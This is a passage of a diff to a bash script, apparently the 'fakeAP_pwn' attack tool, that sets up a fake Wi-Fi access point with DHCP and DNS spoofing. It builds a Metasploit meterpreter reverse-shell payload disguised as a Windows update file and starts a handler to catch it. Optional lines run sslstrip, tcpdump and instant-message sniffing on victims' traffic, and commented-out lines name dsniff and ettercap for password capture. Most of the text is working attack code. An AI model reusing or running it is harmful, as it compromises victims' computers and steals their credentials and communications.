+   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
+   #action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
    sleep 1
    if [ ! -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then display error "Failed: Couldn't create exploit" 1>&2 ; cleanup; fi
 fi
@@ -1436,7 +1436,7 @@ if [ "$apType" == "airbase-ng" ] ; then
       command="airbase-ng -a $fakeMac -W 0 -c $channel -e \"$essid\"" # taken out y (try w,a)
       if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
       if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then command="$command -v"; fi
-      action "Access Point" "$command $monitorInterface" "true" "0|0|4" & # Don't wait, do the next command
+      action "Access Point" "$command $monitorInterface" "0|0|4" & # Don't wait, do the next command
       sleep 3
       ifconfig $apInterface up                                       # The new ap interface
       command=$(ifconfig -a | grep $apInterface | awk '{print $1}')
@@ -1478,7 +1478,7 @@ if [ "$apType" == "airbase-ng" ] ; then
       display error "Couldn't detect the 'fake' access point." 1>&2
    fi
 elif [ "$apType" == "hostapd" ] ; then
-   action "'Fake' Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" "true" "0|0|4" & # Don't wait, do the next command
+   action "'Fake' Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" "0|0|4" & # Don't wait, do the next command
    sleep 3
    if [ -z "$(pgrep hostapd)" ] ; then
       display error "hostapd failed to start." 1>&2
@@ -1506,8 +1506,8 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Permissions" ; fi
-action "DHCP" "chmod 775 /var/run/" "true"
-action "DHCP" "touch /var/lib/dhcp3/dhcpd.leases" "true"
+action "DHCP" "chmod 775 /var/run/"
+action "DHCP" "touch /var/lib/dhcp3/dhcpd.leases"
 if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then # ubuntu - Fixes folder persmissions
    mv "/etc/dhcp3/dhcpd.conf" "/etc/dhcp3/dhcpd.conf.bkup"
    ln "/tmp/fakeAP_pwn.dhcp"  "/etc/dhcp3/dhcpd.conf"
@@ -1515,9 +1515,9 @@ fi
 
 if [ "$mode" == "flip" ] ; then
    mkdir -p "$www/images"
-   action "DHCP" "chmod 755 /tmp/fakeAP_pwn.pl" "true"
-   action "DHCP" "chmod 755 $www/images" "true"
-   action "DHCP" "chown proxy:proxy $www/images" "true"
+   action "DHCP" "chmod 755 /tmp/fakeAP_pwn.pl"
+   action "DHCP" "chmod 755 $www/images"
+   action "DHCP" "chown proxy:proxy $www/images"
 fi
 
 #----------------------------------------------------------------------------------------------#
@@ -1525,7 +1525,7 @@ display action "Starting: DHCP"
 if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then command="dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf $apInterface"
 else command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" ;
 fi
-action "DHCP" "$command" "true" "0|75|5" & # -d = logging, -f = forground # Don't wait, do the next command
+action "DHCP" "$command" "0|75|5" & # -d = logging, -f = forground # Don't wait, do the next command
 sleep 2
 if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
    display error "DHCP server failed to start." 1>&2
@@ -1536,7 +1536,7 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    display action "Starting: DNS"
-   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" "true" "0|165|5" & # Don't wait, do the next command
+   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" "0|165|5" & # Don't wait, do the next command
    sleep 2
 
 #----------------------------------------------------------------------------------------------#
@@ -1545,7 +1545,7 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    if [ ! -z "$command" ] ; then
       display error "Port 4564 isn't free." 1>&2 ;
       command=$(pgrep ruby)
-      action "Killing ruby" "kill $command" "true" # to prevent interference
+      action "Killing ruby" "kill $command" # to prevent interference
       sleep 1
       command=$(netstat -ltpn | grep 4565)
       if [ ! -z "$command" ] ; then display error "Couldn't free port 4564." 1>&2 ; cleanup; fi # Kill it for them?
@@ -1554,7 +1554,7 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
    #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
    #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
-   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" "true" "0|255|15" & #ExitOnSession=false # Don't wait, do the next command
+   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" "0|255|15" & #ExitOnSession=false # Don't wait, do the next command
    sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download
    if [ -z "$(pgrep ruby)" ] ; then
       display error "Metaspliot failed to start." 1>&2
@@ -1563,7 +1563,7 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    fi
 elif [ "$mode" == "flip" ] ; then
    display action "Starting: Squid"
-   action "squid" "squid -f /tmp/fakeAP_pwn.squid" "true"
+   action "squid" "squid -f /tmp/fakeAP_pwn.squid"
    sleep 3
    if [ -z "$(pgrep squid)" ] ; then
       squid -f /tmp/fakeAP_pwn.squid # *** NEED A FIX ***
@@ -1587,7 +1587,7 @@ if [ "$mode" != "normal" ] ; then
       #mv -f "server.key" "/etc/ssl/private/ssl-cert-snakeoil.key"
       #mv -f "server.pem" "/etc/ssl/certs/ssl-cert-snakeoil.pem"
    fi
-   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" "true" & #dissable all sites and only enable the fakeAP_pwn one # Don't wait, do the next command
+   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one # Don't wait, do the next command
    sleep 2
    if [ -z "$(pgrep apache2)" ] ; then
       display error "Apache2 failed to start." 1>&2
@@ -1612,10 +1612,10 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
 #----------------------------------------------------------------------------------------------#
    if [ "$payload" == "vnc" ] ; then
       display action "Configuring: VNC"
-      action "VNC" "vncviewer -listen -compresslevel 4 -quality 4" "true" "0|565|3" & # Don't wait, do the next command
+      action "VNC" "vncviewer -listen -compresslevel 4 -quality 4" "0|565|3" & # Don't wait, do the next command
    elif [ "$payload" == "sbd" ] ; then
       display action "Configuring: SBD"
-      action "SBD" "sbd -l -k g0tmi1k -p $port" "true" "0|565|10" & # Don't wait, do the next command
+      action "SBD" "sbd -l -k g0tmi1k -p $port" "0|565|10" & # Don't wait, do the next command
       sleep 1
    fi
 
@@ -1666,15 +1666,15 @@ fi
 if [ "$extras" == "true" ] ; then
    display action "Caputuring: information from the target"
    ipTables sslstrip
-   action "SSL" "sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl" "true" "515|0|0" & # Don't wait, do the next command
-   #action "Images" "driftnet -i $apInterface" "true" "515|0|0" & # Don't wait, do the next command
-   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" "true" "515|0|10" & # Don't wait, do the next command
-   action "IM" "imsniff $apInterface" "true" "515|155|10" & # Don't wait, do the next command
-   #action "URLs" "urlsnarf -i $apInterface" "true" "515|155|10" & # Don't wait, do the next command
+   action "SSL" "sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl" "515|0|0" & # Don't wait, do the next command
+   #action "Images" "driftnet -i $apInterface" "515|0|0" & # Don't wait, do the next command
+   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" "515|0|10" & # Don't wait, do the next command
+   action "IM" "imsniff $apInterface" "515|155|10" & # Don't wait, do the next command
+   #action "URLs" "urlsnarf -i $apInterface" "515|155|10" & # Don't wait, do the next command
    #webspy / ettercap -P _browser_plugin
-   #action "Passwords" "dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff" "true" "0|0|0" & # Don't wait, do the next command
-   #action "Passwords (2)" "ettercap -Tqp -i $apInterface // //" "true" "10|0|10" & # Don't wait, do the next command
-   #action "IM (2)" "msgsnarf -i $apInterface" "true" "10|0|10" & # Don't wait, do the next command
+   #action "Passwords" "dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff" "0|0|0" & # Don't wait, do the next command
+   #action "Passwords (2)" "ettercap -Tqp -i $apInterface // //" "10|0|10" & # Don't wait, do the next command
+   #action "IM (2)" "msgsnarf -i $apInterface" "10|0|10" & # Don't wait, do the next command
    sleep 1
 fi
 
@@ -1714,4 +1714,4 @@ cleanup clean
 # Use: netsh advfirewall firewall add rule name="allow TightVNC" dir=in program="C:\\winvnc.exe" security=authenticate action=allow
 # Use: vnc.rb in metasploit?
 # Use: Re look at index.php - dont use http://10.0.0.1/[Filename]
-# enable wicd? action "Starting network" "/etc/init.d/wicd start" "true"
+# enable wicd? action "Starting network" "/etc/init.d/wicd start"
